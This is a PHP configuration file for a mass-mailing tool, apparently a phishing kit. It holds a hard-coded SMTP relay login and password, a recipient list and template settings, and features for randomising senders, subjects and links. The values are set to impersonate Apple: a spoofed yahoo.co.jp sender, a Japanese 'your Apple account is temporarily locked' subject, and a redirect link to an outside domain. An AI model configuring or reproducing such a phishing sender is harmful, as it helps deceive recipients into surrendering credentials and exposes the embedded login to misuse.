<?php

/*
   ╔╦╗╦╔═╗╔═╗  ╔═╗╔═╗╔╦╗╦ ╦╔═╗
    ║ ║╠═╝╚═╗  ╚═╗║╣  ║ ║ ║╠═╝
    ╩ ╩╩  ╚═╝  ╚═╝╚═╝ ╩ ╚═╝╩
────────────────────────────────
* Use of other tools already provided by owner SIX. If you have some problem.

* You can contact the manufacturer of the SIX support if you need help or find some error in sender

* If You Want to Contact The SIX Provider You Can Via Contact Below
  FB       : https://www.facebook.com/naehonaa30
  Whatsapp : +6283112425184
$regards = "

* Use wisely. We are not responsible for the GX40 hacking. Because we provide the CLAY As Sender Email basically.

date_default_timezone_set('Asia/Tokyo');
$date = date('F d, Y, h:i A T');

udah ane setting relaynya by zul


$$$$$$\ $$$$$$$$\  $$$$$$\        $$$$$$\           $$\                                           $$\ $$$$$$$$\                     $$\ $$\
\_$$  _|$$  _____|$$  __$$\       \_$$  _|          $$ |                                          $$ |$$  _____|                    \__|$$ |
  $$ |  $$ |      $$ /  \__|        $$ |  $$$$$$$\  $$ |  $$\  $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$$ |$$ |   $$$$$$\  $$$$$$\$$$$\  $$\ $$ |$$\   $$\
  $$ |  $$$$$\    $$ |$$$$\ $$$$$$\ $$ |  $$  __$$\ $$ | $$  |$$  __$$\  \____$$\ $$  __$$\ $$  __$$ |$$$$$\ \____$$\ $$  _$$  _$$\ $$ |$$ |$$ |  $$ |
  $$ |  $$  __|   $$ |\_$$ |\______|$$ |  $$ |  $$ |$$$$$$  / $$ /  $$ | $$$$$$$ |$$ /  $$ |$$ /  $$ |$$  __|$$$$$$$ |$$ / $$ / $$ |$$ |$$ |$$ |  $$ |
  $$ |  $$ |      $$ |  $$ |        $$ |  $$ |  $$ |$$  _$$<  $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |$$ |  $$  __$$ |$$ | $$ | $$ |$$ |$$ |$$ |  $$ |
$$$$$$\ $$ |      \$$$$$$  |      $$$$$$\ $$ |  $$ |$$ | \$$\ \$$$$$$  |\$$$$$$$ |$$$$$$$  |\$$$$$$$ |$$ |  \$$$$$$$ |$$ | $$ | $$ |$$ |$$ |\$$$$$$$ |
\______|\__|       \______/       \______|\__|  \__|\__|  \__| \______/  \_______|$$  ____/  \_______|\__|   \_______|\__| \__| \__|\__|\__| \____$$ |
                                                                                  $$ |                                                      $$\   $$ |
                                                                                  $$ |                                                      \$$$$$$  |
                                                                                  \__|                                                       \______/


";

/*


	Setting your fucking needs here!!

    Fiture :

    * Random From Mail with List in script.
    * Random From Name with List in script.
    * Random Subject with List in script.
    * Random Character.
    * Random Number.
    (+) Tag Replace Email, Tag Random Subject, etc. Use this in ur letter

     		##email## : replace the contents of the letter to show the recipient's email
     		##subject## : Using random subject
     		##frommail## : Using random From mail
     		##fromname## : Using random From name
     		##short## : Using random your URL
     		##country## : Using random country around the world
     		##date## : Using date time. (NOT RANDOM)
    		##OS## : Using random Operating Systems
    		##browser## : Using random Browsers
    		##randomip## : Using randomg IP
    (+ NOte ) Learning Toolkit Using Latter SIX - Learning.html (letter/SIX - Learning.html)
*/

	/*	Pengaturan smtpserver 	*/

		$smtpserver = "smtp-relay.gmail.com";	// Required

	$smtpuser = "support@halahngent.com";		// Required

	$smtppass = "anjsda123";		// Required

	$smtpport = "587";		// Required

	$priority = 3; 		// 1 = High Priority. 0 = Normal Priority

 		# code...
	/*	end 	*/



	/*		Random Fiture	*/

	$userandom = 0;		//	1 untuk menggunakan, 0 untuk tidak
	$sleeptime = 3;		//	Waktu jeda tiap mail. Default 3

	/*	End 	*/



	/*		Setting your f*cking list	*/

	$mailist = "MAILIST/tes.txt";		//	Isi nama file mailist kamu

	/*	End 	*/


	/*	Pengaturan mail 	*/

	$fromname = "Apple";		// Kosongkan jika menggunakan random fiture

	$frommail ="noreplying-lockedservicsundaneses4##randstring##auctions-newsletter@mail.yahoo.co.jp";		// Kosongkan jika menggunakan random fiture
	$subject = "リンゴアカウントが一時的にロックされています";		// Kosongkan jika menggunakan random fiture
	//$subject = "RE: [ New Statement Info ] Confirmation to change password of your account confirmation sent email [FWD]";

	$msgfile = "LETTER/nologo.html";		//Letter harus mengikuti rule GX40 - MIX.html

	$replacement = 1;	//	Untuk mengaktifkan function replace. 1 untuk menggunakan, 0 untuk tidak.

	/*	End 	*/


	/*	Rand url 	*/
    /* For Using Multi (Random Directlink)*/
	/* $randurl = array("");
    /* For Using single Directlink */
    $randurl = array("https://cryptocurrencytracker.info/re.php?ID=##randstring##");
//	Kosongkan jika tidak menggunakan


    /*	End 	*/


    /* Menghapus email yang telah di eksekusi    */

    $userremoveline = 0;		//

    /* End */
